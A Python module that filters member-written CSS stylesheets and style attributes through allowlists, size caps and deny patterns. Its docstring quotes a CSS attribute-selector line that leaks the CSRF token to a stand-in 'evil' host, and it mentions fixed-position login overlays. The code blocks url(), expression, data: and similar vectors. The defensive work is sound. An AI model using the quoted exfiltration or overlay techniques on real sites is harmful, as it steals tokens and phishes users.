# -*- coding: utf-8 -*-
# Copyright © Bruce Perens K6BP. SPDX-License-Identifier: AGPL-3.0-or-later
"""Allowlist filter for the text of a `<style>` element that a member wrote.

[@ANCHOR: zero_sudo:css_stylesheet_filter]
Verified by [@ANCHOR: test_css_stylesheet_filter]

A stylesheet in a member's page runs no script, but it is still hostile material on our origin:
`input[value^="a"] { background: url(https://evil/a) }` reads any value in the page (the CSRF
token field, the viewer's own name) one character at a time through the image requests it
causes, and a `position: fixed` rule covers the site's own chrome with a forged login form.
The filter therefore reads the sheet as rules and re-writes it from the parts it accepts.

What a rule may contain:
  - top level: style rules, `@media <plain condition>` and `@keyframes <name>`. Every other
    at-rule (`@import`, `@font-face`, `@namespace`, `@charset`, `@supports`, `@property`,
    `@container`, ...) is dropped, with its block.
  - selectors: only the characters a selector needs. No escapes, braces, `@` or `<`.
  - declarations: a lower-case property name and a value with no way to fetch a resource or run
    anything: no `url()` except `url(#fragment)`, no `image-set()`, `image()`, `src()`,
    `element()`, `cross-fade()`, `paint()`, `attr()`, no `expression`, `behavior`, `binding`,
    `javascript:`, `data:`, no backslash, no `@`, `<`, `&`, braces, and `position` only
    `static`, `relative` or `absolute` (never `fixed` or `sticky`).

A rule with a backslash in it is dropped, so the result has no comment, no escape and no `<`,
and cannot close the element early either.
Running the filter on its own output changes nothing. It returns `(text, dropped)`; `dropped`
is True when anything the author wrote was removed other than a comment.
"""
import re

MAX_SHEET_CHARS = 64 * 1024
MAX_RULES = 2000
MAX_DECLARATIONS_PER_RULE = 200
MAX_VALUE_CHARS = 500
MAX_MEDIA_DEPTH = 2

_RE_COMMENT = re.compile(r"/\*.*?(?:\*/|\Z)", re.DOTALL)
_RE_FORBIDDEN_CHAR = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f￾￿]")
_RE_SELECTOR = re.compile(r"[A-Za-z0-9_\-\s.,#>+~*:()\[\]=^$|\"'%]{1,500}")
_RE_MEDIA = re.compile(r"@media\s+([A-Za-z0-9\s:,().\-/]{1,200})")
_RE_KEYFRAMES = re.compile(r"@(?:-webkit-)?keyframes\s+([A-Za-z_][A-Za-z0-9_\-]{0,63})")
_RE_KEYFRAME_SELECTOR = re.compile(r"(?:from|to|\d{1,3}(?:\.\d{1,3})?%)(?:\s*,\s*(?:from|to|\d{1,3}(?:\.\d{1,3})?%))*")
_RE_PROPERTY = re.compile(r"(?:--)?[a-z][a-z0-9\-]{1,60}")
_RE_IMPORTANT = re.compile(r"\s*!\s*important\s*$", re.IGNORECASE)
_RE_BAD_VALUE = re.compile(
    r"javascript|vbscript|expression|behavior|binding|image-set|image\s*\(|src\s*\(|"
    r"element\s*\(|cross-fade|paint\s*\(|attr\s*\(|data\s*:|[@<&{}\\\x00-\x08\x0b\x0c\x0e-\x1f\x7f]",
    re.IGNORECASE,
)
_RE_URL_CALL = re.compile(r"url\s*\(", re.IGNORECASE)
_RE_URL_FRAGMENT = re.compile(r"url\(\s*#[A-Za-z][A-Za-z0-9_\-.:]{0,127}\s*\)", re.IGNORECASE)
_BAD_PROPERTIES = frozenset({"behavior", "-moz-binding", "-ms-behavior"})
_POSITIONS = frozenset({"static", "relative", "absolute"})


def _scan(text, start, stops):
    """Index of the first character in `stops` at or after `start` that is outside a string
    and outside parentheses, or len(text). A string left open runs to the end."""
    quote = None
    parens = 0
    i = start
    while i < len(text):
        char = text[i]
        if quote:
            if char == quote:
                quote = None
        elif char in "\"'":
            quote = char
        elif char == "(":
            parens += 1
        elif char == ")":
            parens = max(0, parens - 1)
        elif parens == 0 and char in stops:
            return i
        i += 1
    return len(text)


def _matching_brace(text, start):
    """Index of the `}` closing the `{` at `start`, or None if it never closes."""
    depth = 0
    quote = None
    for i in range(start, len(text)):
        char = text[i]
        if quote:
            if char == quote:
                quote = None
        elif char in "\"'":
            quote = char
        elif char == "{":
            depth += 1
        elif char == "}":
            depth -= 1
            if depth == 0:
                return i
    return None


def _parse_blocks(text):
    """`[(prelude, body or None)]`. `body` is the text inside the braces, None for a statement
    ended by `;` (an at-rule such as `@import ...;`). A trailing fragment becomes a
    (prelude, None) item so that it counts as dropped."""
    items = []
    i = 0
    while i < len(text):
        while i < len(text) and text[i].isspace():
            i += 1
        if i >= len(text):
            break
        end = _scan(text, i, "{;")
        prelude = text[i:end].strip()
        if end >= len(text) or text[end] == ";":
            items.append((prelude, None))
            i = end + 1
            continue
        close = _matching_brace(text, end)
        if close is None:
            items.append((prelude, None))
            break
        items.append((prelude, text[end + 1:close]))
        i = close + 1
    return items


def _clean_value(prop, raw):
    """The value re-written, or None to drop the declaration."""
    value = raw.strip()
    important = ""
    match = _RE_IMPORTANT.search(value)  # audit-ignore-search: re.Pattern, not an ORM search
    if match:
        value = value[:match.start()].strip()
        important = " !important"
    value = re.sub(r"\s+", " ", value)
    if not value or len(value) > MAX_VALUE_CHARS or _RE_BAD_VALUE.search(value):  # audit-ignore-search: re.Pattern, not an ORM search
        return None
    if value.count('"') % 2 or value.count("'") % 2 or value.count("(") != value.count(")"):
        return None
    for call in _RE_URL_CALL.finditer(value):
        if not _RE_URL_FRAGMENT.match(value, call.start()):
            return None
    if prop == "position" and value.lower() not in _POSITIONS:
        return None
    return value + important


def _clean_declarations(body):
    """`(text, dropped)` for the inside of one `{...}` block."""
    kept = []
    dropped = False
    pieces = []
    i = 0
    while i < len(body):
        end = _scan(body, i, ";")
        pieces.append(body[i:end])
        i = end + 1
    for piece in pieces:
        if not piece.strip():
            continue
        prop, sep, raw = piece.partition(":")
        prop = prop.strip().lower()
        if (
            not sep
            or len(kept) >= MAX_DECLARATIONS_PER_RULE
            or not _RE_PROPERTY.fullmatch(prop)
            or prop in _BAD_PROPERTIES
        ):
            dropped = True
            continue
        value = _clean_value(prop, raw)
        if value is None:
            dropped = True
            continue
        kept.append(f"{prop}:{value}")
    return ";".join(kept), dropped


class _Counter:
    rules = 0


def _clean_rules(text, depth, counter, in_keyframes=False):
    """`(rules, dropped)`: the canonical text of the accepted rules in `text`."""
    out = []
    dropped = False
    for prelude, body in _parse_blocks(text):
        if body is None:
            dropped = True
            continue
        counter.rules += 1
        if counter.rules > MAX_RULES:
            return "\n".join(out), True
        if prelude.startswith("@"):
            media = _RE_MEDIA.fullmatch(prelude)
            keyframes = _RE_KEYFRAMES.fullmatch(prelude)
            if media and not in_keyframes and depth < MAX_MEDIA_DEPTH:
                condition = re.sub(r"\s+", " ", media.group(1).strip())
                inner, inner_dropped = _clean_rules(body, depth + 1, counter)
                dropped = dropped or inner_dropped
                if inner:
                    out.append(f"@media {condition}{{{inner}}}")
            elif keyframes and not in_keyframes and depth == 0:
                inner, inner_dropped = _clean_rules(body, depth + 1, counter, in_keyframes=True)
                dropped = dropped or inner_dropped
                if inner:
                    out.append(f"@keyframes {keyframes.group(1)}{{{inner}}}")
            else:
                dropped = True
            continue
        selector = re.sub(r"\s+", " ", prelude)
        valid = _RE_KEYFRAME_SELECTOR if in_keyframes else _RE_SELECTOR
        if not valid.fullmatch(selector) or "{" in body or "}" in body:
            dropped = True
            continue
        declarations, declarations_dropped = _clean_declarations(body)
        dropped = dropped or declarations_dropped
        if declarations:
            out.append(f"{selector}{{{declarations}}}")
        else:
            dropped = dropped or bool(body.strip())
    return "\n".join(out), dropped


def sanitize_stylesheet(text):
    """`(css, dropped)`. `css` is a stylesheet made only of what the rules above accept."""
    if not text or not text.strip():
        return "", False
    if len(text) > MAX_SHEET_CHARS:
        return "", True
    # A comment is deleted, not replaced by a space: `ur/**/l(` then reads as `url(` and is
    # refused, which is stricter than a browser (it reads two tokens) and never looser.
    unterminated = any(
        not match.group(0)[2:].endswith("*/") for match in _RE_COMMENT.finditer(text)
    )
    text = _RE_COMMENT.sub("", text)
    if _RE_FORBIDDEN_CHAR.search(text):  # audit-ignore-search: re.Pattern, not an ORM search
        return "", True
    cleaned, dropped = _clean_rules(text, 0, _Counter())
    return cleaned, dropped or unterminated


MAX_ATTRIBUTE_CHARS = 4000


def sanitize_style_attribute(text):
    """`(declarations, dropped)` for the value of a `style="..."` attribute.

    [@ANCHOR: zero_sudo:css_style_attribute_filter]
    Verified by [@ANCHOR: test_css_style_attribute_filter]

    Same declaration rules as a `<style>` rule body (`_clean_value`: no `url()` except
    `#fragment`, no `image-set()`, `data:`, `expression`, backslash, `position` other than
    static/relative/absolute, ...), applied one declaration at a time. An attribute cannot
    select other elements, but `background:url(https://other-site/x)` is still a third-party
    request per visitor and `position:fixed` still covers the site's own chrome.

    A declaration whose value is refused is removed and the rest kept. Malformed CSS drops the
    whole attribute (returns `("", True)`): an unterminated comment, string or parenthesis, a
    brace, a control character, a declaration with no colon or with a property name that is not
    a plain lower-cased identifier once comments are deleted, or an attribute over the size cap.
    Comments are deleted, not replaced, as in `sanitize_stylesheet`. Running the filter on its
    own output changes nothing. `dropped` is True when anything but a comment was removed.
    """
    if not text or not text.strip():
        return "", False
    if len(text) > MAX_ATTRIBUTE_CHARS:
        return "", True
    if any(not match.group(0)[2:].endswith("*/") for match in _RE_COMMENT.finditer(text)):
        return "", True
    text = _RE_COMMENT.sub("", text)
    if (
        _RE_FORBIDDEN_CHAR.search(text)  # audit-ignore-search: re.Pattern, not an ORM search
        or "{" in text
        or "}" in text
        or text.count('"') % 2
        or text.count("'") % 2
        or text.count("(") != text.count(")")
    ):
        return "", True
    kept = []
    dropped = False
    i = 0
    while i < len(text):
        end = _scan(text, i, ";")
        piece = text[i:end]
        i = end + 1
        if not piece.strip():
            continue
        prop, sep, raw = piece.partition(":")
        prop = prop.strip().lower()
        if not sep or not _RE_PROPERTY.fullmatch(prop):
            return "", True
        if len(kept) >= MAX_DECLARATIONS_PER_RULE or prop in _BAD_PROPERTIES:
            dropped = True
            continue
        value = _clean_value(prop, raw)
        if value is None:
            dropped = True
            continue
        kept.append(f"{prop}:{value}")
    return ";".join(kept), dropped
